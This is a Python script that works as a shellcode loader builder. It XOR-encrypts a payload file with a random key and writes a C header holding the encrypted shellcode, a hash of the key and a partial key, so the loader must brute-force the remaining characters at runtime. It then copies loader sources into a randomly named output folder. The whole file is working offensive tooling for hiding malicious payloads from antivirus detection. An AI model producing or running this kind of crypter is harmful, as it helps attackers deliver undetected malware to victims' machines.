#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random

SEED = 0xdeadbeef

def crc32h_impl(message: bytes, crc: int, i: int) -> int:
    if i >= len(message):
        return (~crc) & 0xFFFFFFFF

    char = message[i]
    crc ^= char
    crc &= 0xFFFFFFFF

    xor_value = 0
    if crc & 1:
        xor_value ^= SEED
    if crc & 2:
        xor_value ^= (SEED >> 1)
    if crc & 4:
        xor_value ^= (SEED >> 2)
    if crc & 8:
        xor_value ^= (SEED >> 3)
    if crc & 16:
        xor_value ^= (SEED >> 4)
    if crc & 32:
        xor_value ^= (SEED >> 5)
    if crc & 64:
        xor_value ^= ((SEED >> 6) ^ SEED)
    if crc & 128:
        xor_value ^= (((SEED >> 6) ^ SEED) >> 1)

    crc = (crc >> 8) ^ xor_value
    crc &= 0xFFFFFFFF

    return crc32h_impl(message, crc, i + 1)

def crc32h(message: bytes) -> int:
    return crc32h_impl(message, 0xFFFFFFFF, 0)

def hash_string(message: str) -> int:
    return crc32h(message.encode('ascii'))

def to_char_array(message: str) -> str:
    return ", ".join([f"0x{ord(c):02x}" for c in message])

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    key_length = len(key)
    return bytes(data[i] ^ key[i % key_length] for i in range(len(data)))


def to_code(file_path: str) -> str:
    with open(file_path, 'rb') as file:
        bytesread = file.read()
    bytes_array = [f"0x{byte:02X}" for byte in bytesread]
    bytes_string_final = ', '.join(bytes_array)
    ps_shellcode = f"unsigned char Shellcode[] = {{ {bytes_string_final} }};"
    return ps_shellcode


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <file>")
        sys.exit(1)

    FILE = sys.argv[1]
    ENC_FILE = f"{FILE}.enc"
    SEED = 0xdeadbeef

    KEY = ''.join(random.choices('0123456789ABCDEF', k=16))
    key_bytes = bytes.fromhex(KEY)

    with open(FILE, 'rb') as file:
        data = file.read()
        encrypted_data = xor_encrypt(data, key_bytes)

    with open(ENC_FILE, 'wb') as enc_file:
        enc_file.write(encrypted_data)

    enc_shellcode = to_code(ENC_FILE)
    key_hash = hash_string(KEY)

    shellcode_h = f"#define SEED {SEED}\n"
    shellcode_h += enc_shellcode
    shellcode_h += f"\nunsigned long SHELLCODE_SIZE = sizeof(Shellcode);\n"
    shellcode_h += f"const unsigned int targetHash = {key_hash};\n"
    shellcode_h += f"const char known[] = {{{to_char_array(KEY[:-4])}}};\n"

    out_dir = f"Loader_{''.join(random.choices('0123456789ABCDEF', k=16))}"
    os.mkdir(out_dir)
    with open(f"{out_dir}/Shellcode.h", 'w') as file:
        file.write(shellcode_h)

    src = ['Main.cc', 'makefile']
    for s in src:
        os.system(f"powershell cp {s} {out_dir}")

    print("done")
    print(f"key: {KEY}")
    os.remove(ENC_FILE)


if __name__ == "__main__":
    main()
